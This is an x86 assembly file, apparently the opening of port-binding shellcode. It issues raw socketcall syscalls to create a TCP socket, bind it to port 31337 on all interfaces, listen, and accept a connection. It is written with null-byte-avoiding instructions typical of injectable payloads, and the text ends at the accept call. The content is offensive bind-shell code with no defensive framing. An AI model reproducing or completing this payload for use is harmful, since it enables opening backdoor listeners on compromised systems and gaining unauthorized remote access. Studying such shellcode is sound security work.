BITS 32

; s = socket(2, 1, 0);
	push BYTE 0x66		; socketcall is syscall #102 (0x66)
	pop eax
	cdq								;	Zero out edx for use as a null DWORD later
	xor ebx, ebx			; ebx is the type of socketcall
	inc ebx						; 1 = SYS_SOCKET = socket()
	push edx					; Build arg array: { protocol = 0,
	push BYTE 0x1			;		(in reverse)     SOCK_STREAM = 1,
	push BYTE 0x2			;										 AF_INET = 2 }
	mov ecx, esp      ; ecx = ptr to argument array
	int 0x80					; After syscall, eax has socket file descriptor

	mov esi, eax			;	save socket FD in esi for later

; bind(s, [2, 31337, 0], 16);
	push BYTE 0x66 
	pop eax
	inc ebx						; ebx = 2 = SYS_BIND = bind()
	push edx					; Build sockaddr struct: INADDR_ANY = 0
	push WORD 0x697a	;				(in reverse)     PORT = 31337					
	push WORD bx			;												 AF_INET = 2
	mov ecx, esp			;	ecx = server struct pointer
	push BYTE 16
	push ecx
	push esi
	mov ecx, esp
	int 0x80

; listen(s, 0);
	mov BYTE al, 0x66
	inc ebx
	inc ebx
	push ebx
	push esi
	mov ecx, esp 
	int 0x80
	
; c = accept(s, 0, 0);
	mov BYTE al, 0x66
	inc ebx
	push edx
	push edx
	push esi
	mov ecx, esp
	int 0x80

